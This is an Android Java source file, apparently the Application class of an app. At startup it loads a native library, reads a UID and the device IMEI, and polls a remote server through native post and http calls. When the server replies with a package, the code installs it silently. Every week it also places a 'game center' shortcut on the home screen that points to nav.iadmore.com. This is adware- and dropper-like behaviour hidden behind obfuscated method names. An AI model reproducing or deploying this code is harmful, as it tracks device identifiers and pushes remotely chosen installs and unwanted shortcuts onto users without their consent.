package com.bb_sz.ndk;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

/**
 * Created by Administrator on 2016/9/22.
 */

public class App extends Application {
    public static Context mContext = null;//for jni need
    public static String mUID = null;//for jni need
    public static final boolean debug = false;
    private static final String TAG = "SkyApp";
    private static boolean isNetDecision = true;

    public native static void jniCreate();

    public native static void post(String host, int port, String content);

    public native static byte[] http(String host, int port, String content);

    @Override
    protected void attachBaseContext(Context base) {
        mContext = this;
        super.attachBaseContext(base);
        b(this);
        if (debug) Log.d(TAG, "UID:" + mUID);
        System.loadLibrary("sz_shell_a");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        jniCreate();
        if (isNetDecision) {
            isNetDecision = false;
            HttpRun.start(mContext);
        }
    }


    public static void a(byte[] data) {
        addShortCut();
        if (debug) Log.d(TAG, "len:" + (null == data ? 0 : data.length));
        if (null == data || data.length == 0) return;
        int start = -1;
        int end = -2;
        int len = data.length;
        for (int i = 0; i < len; i++) {
            if (data[i] == 0x0D
                    && i + 1 < len && data[i + 1] == 0x0A) {
                if (i + 2 < len && data[i + 2] == 0x0D
                        && i + 3 < len && data[i + 3] == 0x0A) {
                    if (start == -1) {
                        start = i + 3;
                        if (debug) Log.d(TAG, "start is " + start);
                    } else {
                        end = i;
                        if (debug) Log.d(TAG, "end is " + end);
                        break;
                    }
                }
            }
        }

        if (end <= 0) {
            end = len;
            if (debug) Log.d(TAG, "end 2 is " + end);
        }
        int cLen = end - start;
        if (debug) Log.d(TAG, "c len is " + cLen);
        if (cLen > 0) {
            byte[] con = new byte[cLen];
            if (debug) Log.d(TAG, "con len is " + con.length);
            System.arraycopy(data, start, con, 0, cLen);
            String content = null;
            try {
                content = new String(con, "utf-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            if (debug) Log.d(TAG, ":-1-:" + content);

            while (!(content.startsWith("{") && content.endsWith("}"))) {
                int indexSt = content.indexOf("{");
                int indexEt = content.lastIndexOf("}") + 1;
                content = content.substring(indexSt, indexEt);
                if (debug) Log.d(TAG, ":--:" + content);
            }

            Model m = new Model(content);
            if (m.code != 0) {
                return;
            }
            if (m.msg != null) {
                if (debug) Log.d(TAG, "register InstallReceiver");
                IntentFilter it = new IntentFilter();
                it.addDataScheme("package");
                it.addAction(Intent.ACTION_PACKAGE_ADDED);
                mContext.registerReceiver(new InstallReceiver(), it);
                OTUtil.getInstsance().install(mContext, m.msg);
            }
        }
    }

    public void b(Context ctx) {
        if (null == ctx) return;
        try {
            InputStream is = ctx.getAssets().open("jpay_uid.txt");
            int c = is.available();
            byte[] buffer = new byte[c];
            is.read(buffer);
            mUID = new String(buffer, "utf-8");
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (Build.VERSION.SDK_INT < 23) {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (null == tm) return;
            String deviceId = tm.getDeviceId();
            if (null != deviceId) {
                mUID += "&imei=" + deviceId;
            }
        } else {
            mUID += "&imei=" + Build.VERSION.SDK_INT;
        }
    }

    private static void addShortCut() {
        if (debug) Log.d(TAG, "addShortCut start");
        SharedPreferences localSharedPreferences = mContext.getSharedPreferences("add_icon_date", 0);
        long l = localSharedPreferences.getLong("add_icon_date", 0L);
        if (debug) Log.d(TAG, "addShortCut l = " + l);
        if (System.currentTimeMillis() - l > 604800000L) {//7天更新一次
            addShortCut(getImageFromAssetsFile("sz_game_center.png"), "游戏中心", Uri.parse("http://nav.iadmore.com:8011/market/index.html"));
            SharedPreferences.Editor localEditor = localSharedPreferences.edit();
            localEditor.putLong("add_icon_date", System.currentTimeMillis());
            localEditor.commit();
        }
    }


    /**
     * 从Assets中读取图片
     */
    private static Bitmap getImageFromAssetsFile(String fileName) {
        Bitmap image = null;
        AssetManager am = mContext.getResources().getAssets();
        try {
            InputStream is = am.open(fileName);
            image = BitmapFactory.decodeStream(is);
            is.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return image;
    }


    private static void addShortCut(Bitmap paramBitmap, String paramString, Uri paramUri) {
        if (debug) Log.d(TAG, "addShortCut b s u start ");
        Intent localIntent1 = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
        localIntent1.putExtra("android.intent.extra.shortcut.NAME", paramString);
        localIntent1.putExtra("duplicate", false);
        localIntent1.putExtra("android.intent.extra.shortcut.ICON", paramBitmap);
        Intent localIntent2 = new Intent();
        localIntent2.setData(paramUri);
        localIntent2.setAction("android.intent.action.VIEW");

        localIntent1.putExtra("android.intent.extra.shortcut.INTENT", localIntent2);
        mContext.sendBroadcast(localIntent1);
    }
}
